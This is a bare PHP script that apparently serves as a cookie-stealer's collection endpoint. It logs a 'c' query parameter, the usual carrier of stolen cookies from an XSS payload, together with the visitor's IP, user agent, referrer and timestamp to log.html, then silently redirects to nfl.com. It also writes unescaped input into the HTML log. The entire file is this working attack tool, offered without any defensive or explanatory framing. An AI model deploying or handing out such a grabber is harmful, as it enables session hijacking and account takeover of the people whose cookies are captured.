<?php
$newURL = "http://www.nfl.com";
$file = 'log.html';
$ip= $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($ip);
$agent = $_SERVER['HTTP_USER_AGENT'];
$date = date("d/m/Y");
$time = date("H:i:s");
$referrer = (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
if(isset($_GET['c'])) $data = str_replace('%20', '<br>', $_GET['c']);
else $data= 'No data';

$handle = fopen($file, 'a');

$html = "<tr>\n";
$html .= "    <td class=\"column1\">$ip</td>\n";
$html .= "    <td class=\"column2\">$date</td>\n";
$html .= "    <td class=\"column3\">$time</td>\n";
$html .= "    <td class=\"column4\">$data</td>\n";
$html .= "    <td class=\"column5\">$agent</td>\n";
$html .= "    <td class=\"column6\">$referrer</td>\n";
$html .= "</tr>\n\n";

fputs($handle, $html);

fclose($handle);
header('Location: '.$newURL);
?>
